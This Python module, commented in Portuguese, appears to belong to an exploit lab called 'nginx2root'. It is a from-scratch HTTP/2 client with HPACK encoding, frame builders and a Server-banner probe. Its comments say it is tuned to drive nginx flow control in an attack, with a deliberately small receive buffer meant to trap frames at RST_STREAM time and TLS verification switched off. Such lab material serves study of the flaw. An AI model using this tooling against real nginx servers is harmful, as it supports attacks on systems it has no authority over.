"""Cliente HTTP/2 minimo, escrito do zero para o laboratorio nginx2root.

Nao usa nenhuma biblioteca HTTP/2 de terceiros (nem `h2`, nem `hpack`).
Implementa apenas o subconjunto de RFC 9113 / RFC 7541 necessario para
dirigir o controle de fluxo do servidor:

  * preface do cliente e SETTINGS
  * HEADERS com um codificador HPACK minimo (literal sem indexacao,
    sem Huffman, sem tabela dinamica)
  * DATA, PING, RST_STREAM, WINDOW_UPDATE, GOAWAY

O objetivo didatico e deixar visivel, byte a byte, o que o ataque envia.
"""

from __future__ import annotations

import socket
import ssl
import struct

CLIENT_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

# Tipos de frame (RFC 9113, secao 6)
DATA = 0x00
HEADERS = 0x01
PRIORITY = 0x02
RST_STREAM = 0x03
SETTINGS = 0x04
PUSH_PROMISE = 0x05
PING = 0x06
GOAWAY = 0x07
WINDOW_UPDATE = 0x08
CONTINUATION = 0x09

# Flags
FLAG_END_STREAM = 0x01
FLAG_ACK = 0x01
FLAG_END_HEADERS = 0x04

# Limites de controle de fluxo (RFC 9113, secao 6.9.1)
MAX_WINDOW = (1 << 31) - 1          # 2147483647
DEFAULT_WINDOW = 65535

# Codigos de erro (RFC 9113, secao 7)
CANCEL = 0x08


def frame_header(ftype: int, flags: int, stream_id: int, length: int) -> bytes:
    return (
        length.to_bytes(3, "big")
        + bytes((ftype, flags))
        + struct.pack("!I", stream_id & 0x7FFFFFFF)
    )


def _hpack_int(prefix_bits: int, value: int) -> bytes:
    """Codifica um inteiro com prefixo N (RFC 7541, secao 5.1)."""
    limit = (1 << prefix_bits) - 1
    if value < limit:
        return bytes((value,))

    out = bytearray((limit,))
    value -= limit
    while value >= 128:
        out.append((value & 0x7F) | 0x80)
        value >>= 7
    out.append(value)
    return bytes(out)


def _hpack_str(value: str | bytes) -> bytes:
    """String literal do HPACK: tamanho + bytes crus (sem Huffman)."""
    if isinstance(value, str):
        value = value.encode()
    return _hpack_int(7, len(value)) + value


def hpack_literal(name_index: int, value: str | bytes) -> bytes:
    """Literal header field without indexing.

    `name_index` > 0 usa a tabela estatica; 0 significa nome literal.
    """
    return _hpack_int(4, name_index) + _hpack_str(value)


# Indices da tabela estatica (RFC 7541, Apendice A)
IDX_AUTHORITY = 1
IDX_METHOD_GET = 2
IDX_METHOD_POST = 3
IDX_PATH_ROOT = 4
IDX_PATH_INDEX = 5
IDX_SCHEME_HTTPS = 7


def encode_request(host: str, path: str, method: str = "GET") -> bytes:
    """Monta um bloco HPACK para uma requisicao simples."""
    block = bytearray()

    if method == "GET":
        block.append(0x80 | IDX_METHOD_GET)
    elif method == "POST":
        block.append(0x80 | IDX_METHOD_POST)
    else:
        block += hpack_literal(0, method)

    block.append(0x80 | IDX_SCHEME_HTTPS)

    if path == "/":
        block.append(0x80 | IDX_PATH_ROOT)
    elif path == "/index.html":
        block.append(0x80 | IDX_PATH_INDEX)
    else:
        block += hpack_literal(IDX_PATH_ROOT, path)

    block += hpack_literal(IDX_AUTHORITY, host)
    return bytes(block)


class H2Connection:
    """Conexao HTTP/2 sobre TLS com ALPN `h2`."""

    def __init__(self, host: str, port: int, rcvbuf: int = 4096,
                 timeout: float = 10.0):
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_alpn_protocols(["h2"])

        raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if rcvbuf:
            # Buffer pequeno de proposito: queremos frames presos na fila
            # de saida do nginx no momento do RST_STREAM.
            raw.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, rcvbuf)
        raw.settimeout(timeout)
        raw.connect((host, port))

        self.host = host
        self.port = port
        self.sock = ctx.wrap_socket(raw, server_hostname=host)
        self.alpn = self.sock.selected_alpn_protocol()
        self.tx = 0
        self.rx = 0

    # -- transporte ---------------------------------------------------
    def send(self, data: bytes) -> None:
        self.sock.sendall(data)
        self.tx += len(data)

    def frame(self, ftype: int, flags: int, stream_id: int,
              payload: bytes = b"") -> None:
        self.send(frame_header(ftype, flags, stream_id, len(payload)) + payload)

    def recv_frame(self):
        header = self._recv_exact(9)
        if header is None:
            return None
        length = int.from_bytes(header[:3], "big")
        ftype, flags = header[3], header[4]
        stream_id = struct.unpack("!I", header[5:9])[0] & 0x7FFFFFFF
        payload = self._recv_exact(length)
        if payload is None:
            return None
        return ftype, flags, stream_id, payload

    def _recv_exact(self, n: int):
        buf = b""
        while len(buf) < n:
            chunk = self.sock.recv(n - len(buf))
            if not chunk:
                return None
            buf += chunk
        self.rx += len(buf)
        return buf

    # -- frames -------------------------------------------------------
    def preface(self, settings: dict[int, int] | None = None) -> None:
        self.send(CLIENT_PREFACE)
        self.settings(settings or {})

    def settings(self, values: dict[int, int]) -> None:
        payload = b"".join(struct.pack("!HI", k, v) for k, v in values.items())
        self.frame(SETTINGS, 0, 0, payload)

    def settings_ack(self) -> None:
        self.frame(SETTINGS, FLAG_ACK, 0)

    def window_update(self, stream_id: int, increment: int) -> None:
        # O campo tem 31 bits; o valor enviado e' sempre mascarado.
        self.frame(WINDOW_UPDATE, 0, stream_id,
                   struct.pack("!I", increment & 0x7FFFFFFF))

    def headers(self, stream_id: int, block: bytes,
                end_stream: bool = False) -> None:
        flags = FLAG_END_HEADERS | (FLAG_END_STREAM if end_stream else 0)
        self.frame(HEADERS, flags, stream_id, block)

    def data(self, stream_id: int, payload: bytes,
             end_stream: bool = False) -> None:
        self.frame(DATA, FLAG_END_STREAM if end_stream else 0, stream_id,
                   payload)

    def ping(self, opaque: bytes = b"\x00" * 8, ack: bool = False) -> None:
        self.frame(PING, FLAG_ACK if ack else 0, 0, opaque)

    def rst_stream(self, stream_id: int, code: int = CANCEL) -> None:
        self.frame(RST_STREAM, 0, stream_id, struct.pack("!I", code))

    def goaway(self, code: int = 0, last_stream_id: int = 0) -> None:
        self.frame(GOAWAY, 0, 0, struct.pack("!II", last_stream_id, code))

    # -- utilidades ---------------------------------------------------
    def read_until_closed(self, seconds: float) -> tuple[int, bool]:
        """Drena a conexao por ate `seconds`; devolve (bytes, morreu)."""
        import time

        self.sock.settimeout(0.5)
        total = 0
        deadline = time.time() + seconds

        while time.time() < deadline:
            try:
                chunk = self.sock.recv(65536)
            except socket.timeout:
                continue
            except OSError:
                return total, True
            if not chunk:
                return total, True
            total += len(chunk)

        return total, False

    def close(self) -> None:
        try:
            self.sock.close()
        except OSError:
            pass


def http1_server_header(host: str, port: int, timeout: float = 5.0) -> str | None:
    """Faz um GET HTTP/1.0 e devolve o cabecalho `Server` (banner)."""
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    # Sem ALPN: o nginx negocia HTTP/1.1 normalmente.
    raw = socket.create_connection((host, port), timeout=timeout)
    try:
        with ctx.wrap_socket(raw, server_hostname=host) as tls:
            req = (
                f"GET / HTTP/1.0\r\nHost: {host}\r\n"
                "User-Agent: n2r-probe\r\n\r\n"
            )
            tls.sendall(req.encode())
            data = b""
            while b"\r\n\r\n" not in data and len(data) < 8192:
                chunk = tls.recv(4096)
                if not chunk:
                    break
                data += chunk
    finally:
        try:
            raw.close()
        except OSError:
            pass

    for line in data.decode("latin-1", "replace").splitlines():
        if line.lower().startswith("server:"):
            return line.split(":", 1)[1].strip()
    return None
